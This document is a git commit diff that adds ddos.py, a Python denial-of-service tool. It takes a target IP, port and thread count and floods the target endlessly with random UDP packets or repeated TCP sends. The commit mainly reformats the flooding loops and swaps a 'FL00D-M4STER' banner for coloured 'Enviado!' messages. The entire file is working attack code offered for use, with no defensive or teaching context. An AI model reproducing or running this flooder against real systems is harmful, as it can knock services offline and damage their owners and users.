02c7676d2938d053afbc7717e162e050037b5c9b
hcosm1c <125148176+hcosm1c@users.noreply.github.com>
2023-04-07 18:11:59 -0300

    Create ddos.py

--- ddos.py
+++ ddos.py
@@ -5,6 +5,7 @@ import socket
 import threading
 import os
 import time
+from colorama import *
 
 ap = argparse.ArgumentParser()
 ap.add_argument("-i", "--ip", required=True, type=str)
@@ -15,12 +16,8 @@ ap.add_argument("-r", "--threads", type=int, default=5)
 args = vars(ap.parse_args())
 
 os.system("clear")
-os.system("setterm -foreground green")
-os.system("figlet FL00D-M4STER")
 time.sleep(5)
 
-print
-os.system("setterm -foreground white")
 ip = args['ip']
 port = args['port']
 choice = args['choice']
@@ -28,39 +25,40 @@ times = args['times']
 threads = args['threads']
 
 def run():
-	data = random._urandom(1024)
-	i = random.choice(("[*]","[!]","[#]"))
-	while True:
-		try:
-			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-			addr = (str(ip),int(port))
-			for x in range(times):
-				s.sendto(data,addr)
-			print(i +" Enviado!!!")
-		except:
-			print("[!] Error!!!")
+    u = random.choice((Fore.GREEN + " Enviado!", Fore.RED + " Enviado!", Fore.BLUE + " Enviado!"))
+    data = random._urandom(1024)
+    i = random.choice(("[*]","[!]","[#]"))
+    while True:
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            addr = (str(ip),int(port))
+            for x in range(times):
+                s.sendto(data,addr)
+            print(i + u)
+        except:
+            print("[!] Error!!!")
 
 def run2():
-	data = random._urandom(16)
-	i = random.choice(("[*]","[!]","[#]"))
-	while True:
-		try:
-			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-			s.connect((ip,port))
-			s.send(data)
-			for x in range(times):
-				s.send(data)
-			print(i +" Enviado!!!")
-		except:
-			s.close()
-			print("[*] Error")
+    i = random.choice(("[*]","[!]","[#]"))   
+    u = random.choice((Fore.GREEN + " Enviado!", Fore.RED + " Enviado!", Fore.BLUE + " Enviado!"))
+    data = random._urandom(16)
+    while True:
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect((ip,port))
+            s.send(data)
+            for x in range(times):
+                s.send(data)
+            print(i + u)
+        except:
+            s.close()
+            print("[*] Error")
 
 for y in range(threads):
-	if choice == 'Y':
-		th = threading.Thread(target = run)
-		th.start()
-	else:
-		th = threading.Thread(target = run2)
-		th.start()
-
+    if choice == 'Y':
+        th = threading.Thread(target = run)
+        th.start()
+    else:
+        th = threading.Thread(target = run2)
+        th.start()
 
